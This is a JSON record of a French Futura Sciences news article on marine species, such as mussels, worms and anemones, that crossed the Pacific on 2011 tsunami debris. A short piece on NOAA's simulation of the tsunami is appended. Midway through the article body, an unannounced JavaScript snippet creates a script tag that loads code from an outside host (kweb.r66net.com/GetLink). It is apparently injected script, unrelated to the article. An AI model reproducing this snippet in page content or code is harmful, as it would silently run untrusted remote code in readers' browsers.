{"title": "Tsunami de 2011 : ces espèces qui ont traversé le Pacifique", "newspaper": "Futura Sciences", "author": "Nathalie Mayer", "date_publi": "04/10/2017", "content": "Certains débris générés par le tsunami de 2011, au Japon, ont parcouru des milliers de kilomètres avant de venir s'échouer sur les côtes des États-Unis. Le voyage a parfois duré quelque cinq années. Or, ces débris ont emporté des dizaines d'espèces marines arrivées vivantes à destination ! Que des espèces côtières soient capables de survivre à un  voyage transocéanique , les spécialistes du  Smithsonian Environmental Research Center  et de l' Oregon State University  (États-Unis) ne l'avaient pas envisagé. Pourtant, depuis 2012, ils ont retrouvé, sur les côtes d'Hawaï et de l'ouest des États-Unis, pas moins de 289 espèces vivantes et originaires du Japon. Elles sont arrivées là à bord de radeaux de fortune faits de débris jetés à l'eau après le  tsunami de 2011 . Au premier rang des passagers clandestins : des mollusques comme les moules. Puis, arrivent des vers, des anémones de mer, des méduses, des crustacés ou des bryozoaires. Autant d'espèces qui n'auraient pas dû survivre aux conditions difficiles rencontrées en plein océan. Mais les chercheurs supposent que leur lente vitesse de croisière — pas plus de 2 nœuds, contre 20 nœuds pour des bateaux commerciaux — leur a permis de s'adapter. Même si des chercheurs ont retrouvé des espèces provenant des côtes japonaises aux États-Unis (comme ces mollusques marins, par exemple), aucune d’entre elles n’a colonisé les lieux. Enfin, pour l’instant peut-être, car il peut prendre plusieurs années à une population pour s’installer. © John Chapman,  Oregon State University                               Gare aux espèces invasives La présence parmi les débris de nombreux plastiques — non altérés par l'action de l'océan — semble également leur avoir facilité le voyage. De quoi inquiéter les chercheurs. Car, chaque année, plusieurs millions de tonnes de  déchets plastique  sont jetées à la mer. Et, avec l'augmentation du nombre d'ouragans et de typhons due au  réchauffement climatique , la répartition des espèces marines à travers le globe pourrait se voir toute chamboulée.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La prolifération d'espèces invasives apparaît donc comme une conséquence imprévue de la pollution des océans par des matières plastiques. C'est pourquoi les scientifiques appellent à la vigilance et à une meilleure gestion de ces déchets. Pour en savoir plus En bref : le tsunami du 11 mars 2011 recréé par ordinateur Article de Laurent Sacco paru le 19/03/2011 Les  ordinateurs  modernes ne permettent pas seulement de prévoir le  climat , ils sont aussi capables de simuler le comportement de l'océan lors d'un  tsunami . Des chercheurs de la  National Oceanic and Atmospheric Administration  ( NOAA ) ont ainsi généré des images de la propagation du tsunami du 11 mars 2011 à partir des données enregistrées dans l'océan Pacifique DART  ( Deep-ocean Assessment and Reporting of Tsunamis ) est un système de bouées réparties dans le Pacifique enregistrant l'amplitude des ondes d'un  tsunami  à la surface de cet océan. En utilisant les  simulations numérique  de  MOST  nourries de ces données, les géophysiciens du centre de recherche sur les tsunamis de la NOAA ont reconstitué dans une étonnante vidéo la chronologie et la forme des ondes à la surface de l'océan Pacifique lors du  tsunami du 11 mars 2011 . La vidéo de la reconstitution du Tsunami. La chronologie des événements est en haut à droite. ©  NOAA Center for Tsunami Research On peut ainsi voir une grande richesse d'ondes réfléchies par les côtes ou les hauts fonds, diffractées et formant des figures d' interférences , à cause de la complexité des fonds marins et de leur topographie. Une description simplifiée de ce phénomène peut être donnée à l'aide d'une image en fausses  couleurs  donnant l'amplitude maximale de ces ondes. On peut la voir à la fin de la vidéo. ", "theme": "planete"}